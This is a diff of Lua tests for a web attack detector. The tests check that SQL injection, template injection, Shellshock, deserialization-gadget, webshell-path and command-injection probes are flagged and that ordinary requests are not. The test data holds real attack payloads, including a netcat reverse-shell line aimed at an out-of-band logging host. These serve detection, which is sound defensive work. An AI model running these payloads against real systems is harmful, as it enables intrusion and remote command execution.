@@ -416,7 +416,51 @@ hit = sem.inspect("print(811135720+853369319)", "/search.php")
 check("inspect print probe e2e", hit and hit.type == "code_injection")
 hit = sem.inspect("() { :; }; /bin/bash -c 'expr 1 + 2'", "/")
 check("inspect shellshock e2e", hit and hit.type == "rce")
--- 第二轮：SSTI/RCE/SQLi 归一化绕过
+-- 门控一致性：detect_* 判定为真的样本，inspect() 必须同样返回命中。
+-- has_attack_candidate 是前置快速过滤，漏登记标记会让整个检测器静默失效
+-- （已发生过三次：门控 PCRE 语法错误、%f[%w] 前沿失效、新签名未同步门控）。
+local GATE_CASES = {
+    {"java class gadget", "java.lang.Comparable"},
+    {"templatesimpl gadget", "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"},
+    {"logback gadget", "com.newrelic.agent.deps.ch.qos.logback.core.db.DriverManager"},
+    {"assert base64", ";assert(base64_decode('cHJpbnQobWQ1KDMxMzM3KSk7'));"},
+    {"nodejs proto chain", "this.constructor.constructor('return process')().mainModule.require('http')"},
+    {"bin sleep shellshock", "() { _; } >_[$($())] { echo; /bin/sleep 5; }"},
+    {"h2 alias", "1';CREATE ALIAS sleep222 FOR \"java.lang.Thread.sleep\";CALL sleep222(0);select '1"},
+    {"group by concat", "-8511 OR 1 GROUP BY CONCAT(0x7e,md5(829646656),0x7e,FLOOR(RAND(0)*2)) HAVING MIN(0)#"},
+    {"concat arithmetic", "concat(9876*9876,0x3a,9876*9876)"},
+    {"oracle concat", "createTime'||1/0||'"},
+    {"oracle decode", "createTime'/**/and/**/(decode(length(123),3,1,0))"},
+    {"serialized sql map", "45ea207d|a:2:{s:3:\"num\";s:107:\"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5"},
+    {"comment bypass", "9/**/and 6955=6955"},
+    {"cast md5 bypass", "N/**/and/**/cast(md5('1649799944')as/**/int)>0"},
+    {"aspx shell", "/plugin/shell.aspx"},
+    {"jsp spy", "/m2/jspspy.aspx"},
+    {"windows win ini", "C:/windows/win.ini"},
+    {"oast ping", "'\nping d8at5iqs3g7tohdr5q20hqikeqk4tnat1.oast.online\n'"},
+    {"nc oast", "nc -e /bin/sh 1234.abcdefgh.hzajrx6o.ser.dnslog.bid 1337"},
+    {"md5sum probe", "echo CVE-2023-41109 | md5sum"},
+    {"ssti arithmetic", "/*1*/{{883110996+885856194}}"},
+    {"version comment", "@`'`/*!50000Union */ /*!50000select */ md5(819315968) -- @`'`"},
+    {"expr ifs bypass", "'\nexpr${IFS}875507985${IFS}-${IFS}924841934\n'"},
+    {"mysql version union", "-1)union(select(3),null,null,null,null,null,str(41637*40875),null"},
+    {"waitfor comment", "N';WAITFOR/**/DELAY'0:0:6'--"},
+    {"thinkphp construct", "__construct()"},
+    {"sh -c bare", "sh -c id"},
+}
+for _, c in ipairs(GATE_CASES) do
+    check("gate admits: " .. c[1], sem.inspect(c[2], "/") ~= nil)
+end
+-- 门控不得放行普通业务流量（误报防线）
+local GATE_CLEAN = {
+    "hello world", "/api/article-list?page=1&size=20", "/assets/app.js",
+    "price is 100|200", "user/profile", "/docs/readme.md", "color or size",
+    "learn javascript: basics", "select your seats from the map", "2024-01-01",
+}
+for _, c in ipairs(GATE_CLEAN) do
+    check("gate clean: " .. c, sem.inspect(c, c) == nil)
+end
+
 check("ssti space arithmetic", sem.detect_ssti("/*1*/{{883110996 885856194}}"))
 check("ssti plus arithmetic", sem.detect_ssti("{{883110996+885856194}}"))
 check("rce semicolon id redirect", sem.detect_rce("x;id>qqzfr.txt"))
@@ -432,6 +476,12 @@ check("sqli jeecg from sys_user", sem.detect_sqli("' from sys_user/*, '"))
 check("sqli jeecg dict password", sem.detect_sqli("tableName=sys_user&text=password,salt"))
 check("rce normal id word", not sem.detect_rce("what is my user id"))
 -- 第三轮：字面 \n、版本注释、OAST、Windows 敏感路径
+-- SQL 注释剥离后的漏网形态（gate 守卫发现）
+check("sqli cast md5 after strip", sem.detect_sqli("N/**/and/**/cast(md5('1649799944')as/**/int)>0"))
+check("sqli union parenthesized", sem.detect_sqli("-1)union(select(3),null,null,null,null,null,str(41637*40875),null"))
+check("sqli select from strip", sem.detect_sqli("1779802281'and(select'1'from/**/cast(md5(1371423727)as/**/int))>'0"))
+check("sqli and only after strip", sem.detect_sqli("9/**/and 6955=6955"))
+check("sqli strip no comments", not sem.detect_sqli("read a book about cats"))
 check("sqli double quote tautology", sem.detect_sqli('""or""=""'))
 check("sqli numeric or probe", sem.detect_sqli("2147483647 or 1=2"))
 check("sqli mysql version comment", sem.detect_sqli("@`'`/*!50000Union */ /*!50000select */ md5(819315968) -- @`'`"))
